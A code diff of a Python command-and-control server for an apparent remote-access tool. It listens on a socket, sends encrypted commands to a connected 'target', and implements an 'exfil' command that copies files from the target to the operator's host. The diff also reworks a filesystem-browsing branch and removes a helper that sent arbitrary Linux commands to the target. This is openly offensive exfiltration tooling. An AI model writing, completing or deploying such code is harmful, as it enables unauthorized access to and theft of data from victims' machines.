@@ -47,23 +47,6 @@ def decrypt_aes(recipeseed, encrypted_data):
     unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
     return unpadded_data
 
-def send_linux_command(cmd : bytes):
-    conn.sendall(encrypt_tdes(key, cmd))
-    
-    response = []
-    while True:
-        r = decrypt_tdes(key, conn.recv(4096)).decode()
-
-        if "Done" in r:
-            break
-
-        if len(response) == 0:
-            response = json.loads(r)
-        else:
-            response += json.loads(r)
-    
-    return response
-
 # Create a socket object
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((SERVER_IP, SERVER_PORT))
@@ -94,7 +77,7 @@ while True:
 
         response = []
 
-        if message.split(' ')[0] == "exfil":
+        if message.split(' ')[0] == "exfil": # Exfil files from target to host
             if len(message.split(' ')) > 1:
                 filename = message.split(' ')[1]
                 file_for_us = message.split('\\')[-1]
@@ -113,24 +96,23 @@ while True:
 
                 print("File written successfully!")
             else:
-                conn.sendall(encrypt_tdes(key, message.encode()))
+                print("Missing file to exfil.")
+        else:  # View filesystem
+            conn.sendall(encrypt_tdes(key, message.encode()))
+    
+            while True:
+                r = decrypt_tdes(key, conn.recv(4096)).decode()
 
-                while True:
-                    r = decrypt_aes(key, conn.recv(4096)).decode()
+                if "Done" in r:
+                    break
 
-                    if "Done" in r:
-                        break
-
-                    if len(response) == 0:
-                        response = json.loads(r)
-                    else:
-                        response += json.loads(r)
+                if len(response) == 0:
+                    response = json.loads(r)
+                else:
+                    response += json.loads(r)
                 
                 print(response)
-        else:  
-            response = send_linux_command(message.encode())
-            print(response)
 
-        if len(response) == 0:
-            print("Connection to {} closed".format(addr[0]))
-            break
+            if len(response) == 0:
+                print("Connection to {} closed".format(addr[0]))
+                break
